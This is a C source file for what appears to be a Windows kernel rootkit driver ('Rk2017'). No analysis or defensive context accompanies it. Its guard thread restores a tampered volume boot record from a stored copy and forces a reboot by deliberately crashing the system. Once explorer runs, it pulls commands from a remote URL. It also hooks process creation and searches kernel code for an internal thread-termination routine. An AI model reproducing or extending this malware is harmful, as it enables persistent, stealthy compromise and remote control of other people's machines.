#include "rk.h"
#include "InitializeInjectRelevantInfo.h"
#include "ApcKillProcess.h"
#include "SystemPreInit.h"
#include "TdiSocket.h"
#include "DrvRegSystem.h"
#include "TimeUtils.h"
#include "Sector.h"
#include "DrvFileSystem.h"

BOOLEAN g_bExitGuardThread = FALSE;
BOOLEAN g_bUninstalled = FALSE;
PCHAR g_pVbr = NULL;

VOID SystemReboot()
{
	KeBugCheckEx(POWER_FAILURE_SIMULATE,0,0,0,0);	
	while (TRUE)
	{
		SystemSleep(1);
		KeBugCheckEx(POWER_FAILURE_SIMULATE,0,0,0,0);
	}
}
BOOLEAN DrvCheckFileSystemIsOK()
{
	HANDLE              FileHandle          = 0;
	OBJECT_ATTRIBUTES   ObjectAttributes    = {0};
	UNICODE_STRING      FileName            = {0};
	IO_STATUS_BLOCK     IoStatus            = {0};
	NTSTATUS            Status              = STATUS_SUCCESS;
	BOOLEAN				bRet                = FALSE;

	RtlInitUnicodeString(&FileName, L"\\Device\\HarddiskVolume1");
	InitializeObjectAttributes(&ObjectAttributes,  &FileName, OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE, NULL, NULL );
	Status = ZwCreateFile(
		&FileHandle, 
		(SYNCHRONIZE | FILE_READ_ATTRIBUTES),
		&ObjectAttributes,
		&IoStatus, 
		NULL, 
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ, 
		FILE_OPEN, 
		FILE_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT, 
		NULL, 
		0);

	if(NT_SUCCESS(Status))
	{		
		ZwClose(FileHandle);
		bRet = TRUE;
	}
	return bRet;
}
static BOOLEAN NeedRun()
{
	LONG now_run;
	LONG last_run;
	last_run = RegRead(RUN_SUBKEY_NAME,g_Rk2017RunTimeLibrary.wDrvName);
	if(last_run<=0)
	{
		return TRUE;
	}
	now_run = MyGetCurrentTime_S();
	if((now_run < last_run) || (now_run - last_run >= RUN_TARGET_INERVAL * 60 * 60))
	{
		return TRUE;
	}
	return FALSE;
}

static VOID WriteLastRun()
{
	LONG now_run = MyGetCurrentTime_S();
	RegWrite(RUN_SUBKEY_NAME,g_Rk2017RunTimeLibrary.wDrvName,now_run);
}
VOID __stdcall GuardWorkThread(PVOID pContext)
{
	NTSTATUS Status;
	ULONG ulWaitBeforeRun;
	ULONG ulWaitBeforeReboot;
	BOOLEAN bIsCheck;

	UNREFERENCED_PARAMETER(pContext);

	Status = STATUS_SUCCESS;
	ulWaitBeforeRun = 0;
	ulWaitBeforeReboot = 0;
	bIsCheck = TRUE;

	KeSetPriorityThread(KeGetCurrentThread(),LOW_REALTIME_PRIORITY);

	while(TRUE)
	{
		if(g_bUninstalled)
		{
			break;
		}
		if(g_bExitGuardThread) 
		{
			break;
		}
		//reboot
		if(ulWaitBeforeReboot && ulWaitBeforeReboot <=2)
		{
			SystemReboot();
		}
		//Check file and mbr or vbr
		if (VbrCheck() && g_bUninstalled == FALSE)
		{
			WriteVbrFromSector(g_pVbr,VBR_DEFAULT_SIZE);
			ulWaitBeforeReboot++;
		}
		//检测时间,explorer运行后20秒启动
		if(g_hExplorerProcessId)
		{
			if (bIsCheck)
			{
				//if (NetWorkIsOk(0xed7f5dda,0x50c3))
				//{
				bIsCheck = GetCommandFromUrl(CONNECT_COMMAND_PACKET_URL,CONNECT_COMMAND_PACKET_PORT);
				if (bIsCheck)
				{
					bIsCheck = FALSE;
				}
				//}
			}
		}

		////终止target
		//if(g_SysApp->m_TargetTickout && (MyGetTickCount_S() - g_SysApp->m_TargetTickout>= TERMINATE_PROCESS_TIMEOUT))
		//{
		//	LogPrint("watchdog need kill process now,tickcount=%d,time=%d\n",MyGetTickCount_S(),MyGetCurrentTime_S());
		//	if(NT_SUCCESS(MyTerminateProcess(g_SysApp->m_TargetPID,STATUS_SUCCESS)))
		//	{
		//		g_SysApp->m_TargetPID=0;
		//		g_SysApp->m_TargetTickout=0;
		//	}
		//}
		//Sleep
		SystemSleep(WATCHDOG_INTERNAL);
	}
	PsTerminateSystemThread(1);
}
NTSTATUS DoWork(PINJECT_RELEVANT_OFFSET pInjectRelevantOffset)
{
	NTSTATUS Status;
	HANDLE hSysThread;

	Status = STATUS_SUCCESS;
	hSysThread = NULL;

	do 
	{
		if (pInjectRelevantOffset->WindowsVersion.bIsWindows2000 || \
			pInjectRelevantOffset->WindowsVersion.bIsUnknow)
		{
			break;
		}
		Status = PsCreateSystemThread(&hSysThread, \
			(ACCESS_MASK)0L, \
			NULL, \
			NULL, \
			NULL, \
			GuardWorkThread, \
			NULL);
		if (NT_SUCCESS(Status))
		{
			ZwClose(hSysThread);
		}
		g_InjectRelevantOffset.PspTerminateThreadByPointer = SearchHexCodeFromAddress(PsTerminateSystemThread);
		Status = PsSetCreateProcessNotifyRoutine(CreateProcessRoutine,FALSE);

	} while (0);

	return Status;
}
#ifdef _DEBUG
NTSTATUS WriteHere(WCHAR *FileName,PVOID pBuffer,ULONG ulLength)
{
	NTSTATUS Status;
	IO_STATUS_BLOCK IoStatus;
	UNICODE_STRING unFileName;
	OBJECT_ATTRIBUTES objectattr;
	HANDLE hFile;

	RtlInitUnicodeString(&unFileName,FileName);
	InitializeObjectAttributes(&objectattr,&unFileName,OBJ_CASE_INSENSITIVE,NULL,0);

	Status = ZwCreateFile(&hFile,0x10000000,&objectattr,&IoStatus,0,0x80,7,3,0x20,0,0);
	if (NT_SUCCESS(Status))
	{
		Status = ZwWriteFile(hFile,NULL,NULL,NULL,&IoStatus,pBuffer,ulLength,0,NULL);
		if (NT_SUCCESS(Status))
		{
			DbgPrint("ZwWriteFile success.\n");
			ZwClose(hFile);
		}
	}
	else
	{
		DbgPrint("ZwCreateFile failed\r\n");
	}
	return Status;
}
#endif
VOID DrvReInitCallback(PDRIVER_OBJECT pDriverObject,PVOID pContext,ULONG ulCount)
{
	if (!DrvCheckFileSystemIsOK())
	{
		//注册一个重新初始化
		IoRegisterDriverReinitialization(pDriverObject,DrvReInitCallback,pContext);
	}
	else
	{
#ifdef _DEBUG
		WriteHere(L"\\??\\C:\\Cbx.Hacker", L"Hacker By:Cbx",0x1C);
#endif
		DoWork(&g_InjectRelevantOffset);
	}
}
void CheckFileSystem(PDRIVER_OBJECT pDriverObject)
{
	if (!DrvCheckFileSystemIsOK())
	{
		IoRegisterDriverReinitialization(pDriverObject,DrvReInitCallback,NULL);
	}
	else
	{
#ifdef _DEBUG
		WriteHere(L"\\??\\C:\\Cbx.Hacker", L"Hacker By:Cbx",0x1C);
#endif
		DoWork(&g_InjectRelevantOffset);
	}
}